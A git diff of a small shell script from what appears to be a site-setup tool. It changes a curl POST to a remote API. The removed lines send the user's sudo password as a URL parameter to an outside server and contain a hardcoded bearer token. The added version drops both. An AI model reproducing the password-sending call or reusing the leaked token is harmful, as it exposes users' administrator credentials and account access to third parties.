@@ -1,10 +1,12 @@
+#!/bin/sh
+
+#  call.sh
+#
+# This system Powered by Mutasem Elayyoub DDKits.com 
+MYIP='dig @resolver1.opendns.com ANY myip.opendns.com +short'
 curl -v --request POST \
-  --url 'https://rest.reallexi.com/api/ddk/1_ddkits_api?web='${DDKITSSITES}'&platform='${PLATFORM}'&email='${MAIL_ADDRESS}'&sudo='${SUDOPASS}'' \
+  --url 'https://getfreeapi.com/api/ddk/1_ddkits?domain='${DDKITSSITES}'&platform='${PLATFORM}'&opt='${opt}'&email='${MAIL_ADDRESS}'' \
   --header 'Accept: application/json' \
-  --header 'Authorization: Bearer EtM0bvGvVcd7JJOrWl5MW8RSe54fFFrJxNIC5qmmEzXreCJmFeWLpoRf1zf1' \
-  --header 'Cache-Control: no-cache' \
-  --header 'Connection: keep-alive' \
-  --header 'Host: rest.reallexi.com' \
-  --header 'User-Agent: PostmanRuntime/7.13.0' \
-  --header 'accept-encoding: gzip, deflate' \
+  --header 'Authorization: Bearer '${TO}'' \
+  --header 'Host: getfreeapi.com' \
   --header 'cache-control: no-cache'
